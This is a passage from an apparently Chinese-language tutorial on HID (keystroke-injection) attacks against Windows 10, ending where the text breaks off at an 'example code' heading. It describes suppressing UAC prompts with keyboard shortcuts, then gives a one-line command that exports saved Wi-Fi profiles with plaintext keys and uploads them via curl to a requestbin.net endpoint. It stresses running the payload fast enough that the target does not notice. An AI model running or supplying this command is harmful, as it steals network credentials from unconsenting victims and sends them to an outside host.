0x04 UAC Bypass


    绕过这个万恶的UAC！曾在某群里看到有人说模拟鼠标移动点击即可绕过，或者是键盘上的←键加回车，没有那么麻烦，其实直接可以使用alt+y绕过uac，在执行hid攻击时我们需要使用管理员的权限所以要执行ctrl+shift+enter。


0x05 WIFI Password

    

    我们如何获取wifi密码呢？理清思路首先获取windows10下链接的密码然后发送到一个目标下，当然有很多种方式，不同的环境都有不同的手法，并且需要快速执行我们的payload才不会被目标发现。

netsh wlan export profile key=clear && type *.xml >666.txt && curl http://requestbin.net/r/1mg8g8s1 -F file=@666.txt && exit

    获取目标链接的wifi密码，将存储下来的wifi密码重命名到当前目录下的666.txt，利用windows10下curl工具将当前目录下666.txt文件密码发送到requestbin.net，最后退出。


 示例代码:
